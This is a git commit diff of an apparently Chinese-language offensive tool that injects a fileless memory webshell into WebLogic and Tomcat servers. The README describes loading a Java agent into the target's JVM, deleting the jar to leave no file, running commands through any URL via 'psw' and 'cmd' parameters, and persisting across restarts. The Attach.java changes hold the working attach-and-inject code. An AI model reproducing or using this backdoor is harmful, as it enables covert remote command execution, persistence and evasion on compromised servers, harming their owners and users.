09221c76d24e2b0f51371c5a1292f0829d49a5be
zii zii <ziizhuwy@gmail.com>
2021-06-19 21:36:30 +0800

    1.1

--- README.md
+++ README.md
@@ -6,34 +6,44 @@
 * Jdk 1.5-1.8
 * openJDK
 
-# 兼容版本(已测试)
+# 兼容版本
 * weblogic 10.3.6
 * weblogic 12.2.1.2
 * weblogic 12.2.1.3
 * weblogic 12.1.3.0
-# 测试平台(已测试)
-* macos 11.0.1
+* Tomcat 8.5.61
+>其他容器及其版本暂未测试
+
+# 测试平台
+* macos 10.0+
 * centos 7.1
->其他暂未测试
+* windows 10
+>其他操作系统暂未测试
+
+# 更新
+## 2021/06/19
+* 修改hook点为`javax/servlet/FilterChain`，使其同时兼容tomcat.
+* weblogic注入内存马，现在访问任意url，带上密码和命令即可
 
 # 使用说明
 1. 克隆本项目。
 2. `cd inject`->`mvn clean package`
 3. `cd memshell_asm`->`mvn clean package`
-4. 将生成jar包统一放入待攻击的服务器中，运行`java -jar inject-1.0.jar your_password`，即可注入。
+4. 将生成jar包统一放入待攻击的服务器中，运行`java -jar inject.jar [your_password]`，即可注入。
 5. 访问任意url，带上参数`psw=your_password&cmd=your_cmd`,即可执行命令。
 # 测试案例
 运行`java -jar inject-1.0.jar x1001`
 ![java](./img/java.png)
 在服务器端可以看到以下，说明注入成功，并删除当前jar包，达到无shell状态：
 ![server](./img/server.png)
-访问任意应用不存在的url（**weblogic必须部署应用**），带上参数`psw=your_password&cmd=your_cmd`
+访问任意url，带上参数`psw=your_password&cmd=your_cmd`
 ![request](./img/request.png)
 当应用关闭时。攻击jar包自动生成到java虚拟机目录下。
 ![persist](./img/persist.png)
 下次启动，自动注入达到持久化的效果。
 ![persist2](./img/persist2.png)
-> 经测试，通过`kill -9`杀死weblogic进程，并不会触发`addShutdownHook`,也就不会持久化。
+
+> 经测试，通过`kill -9`或者`强制结束进程`杀死容器进程，并不会触发`addShutdownHook`,也就不会持久化。
 >网上查询以下几种杀死进程的情况:
 >* 所有的线程已经执行完毕（√）
 >* 调用System.exit()（√）
--- inject/src/main/java/Attach.java
+++ inject/src/main/java/Attach.java
@@ -9,47 +9,49 @@ import java.util.List;
 
 public class Attach {
 
-	public static void main(String[] args) throws Exception {
-		String property = System.getProperty("java.io.tmpdir");
-		System.out.println(property);
-		VirtualMachine vm = null;
-		List<VirtualMachineDescriptor> vmList = null;
-		String password = args[0];
-		String currentPath = Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath();
-		currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
-		String agentFile = currentPath + "shell-agent.jar";
-		agentFile = new File(agentFile).getCanonicalPath();
-		String agentArgs = currentPath;
-		agentArgs = agentArgs + "^" + password;
+    public static void main(String[] args) throws Exception {
+        if (args.length == 0) {
+            System.out.println("Usage: java -jar inject-1.0.jar <password>");
+            return;
+        }
+        VirtualMachine vm = null;
+        List<VirtualMachineDescriptor> vmList = null;
+        String password = args[0];
+        String currentPath = Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath();
+        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
+//        String agentFile = currentPath + "shell-agent.jar";
+        String agentFile ="D:\\IntelliJ IDEA 2021.1.2\\project\\weblogic_memshell\\memshell_asm\\target\\shell-agent.jar";
 
-		while (true) {
-			try {
-				vmList = VirtualMachine.list();
-				if (vmList.size() <= 0)
-					continue;
-				for (VirtualMachineDescriptor vmd : vmList) {
-					//
-					if (vmd.displayName().contains("weblogic.Server") ) {
-						vm = VirtualMachine.attach(vmd);
-						System.out.println("[+]OK.i find a jvm.");
-						Thread.sleep(1000);
-						System.out.println("agent.jar 加载路径："+agentFile);
-						if (null != vm) {
-							vm.loadAgent(agentFile, agentArgs);
-							System.out.println("[+]memeShell is injected.");
-							vm.detach();
-							return;
-						}
-					}
-				}
-				Thread.sleep(3000);
-			}catch (AgentLoadException e1){
-				System.out.println("shell-agent.jar 错误。Agent JAR not found or no Agent-Class attribute");
-				System.exit(-1);
-			}
-			catch (Exception e) {
-				e.printStackTrace();
-			}
-		}
-	}
+        agentFile = new File(agentFile).getCanonicalPath();
+        String agentArgs = currentPath;
+        agentArgs = agentArgs + "^" + password;
+
+        while (true) {
+            try {
+                vmList = VirtualMachine.list();
+                if (vmList.size() <= 0)
+                    continue;
+                for (VirtualMachineDescriptor vmd : vmList) {
+                    if (vmd.displayName().contains("weblogic.Server") || vmd.displayName().contains("catalina")) {
+                        vm = VirtualMachine.attach(vmd);
+                        System.out.println("[+]OK.i find a jvm.");
+                        Thread.sleep(1000);
+                        System.out.println("agent.jar 加载路径：" + agentFile);
+                        if (null != vm) {
+                            vm.loadAgent(agentFile, agentArgs);
+                            System.out.println("[+]memeShell is injected.");
+                            vm.detach();
+                            return;
+                        }
+                    }
+                }
+                Thread.sleep(3000);
+            } catch (AgentLoadException e1) {
+                System.out.println("shell-agent.jar 错误。Agent JAR not found or no Agent-Class attribute");
+                System.exit(-1);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }
 }
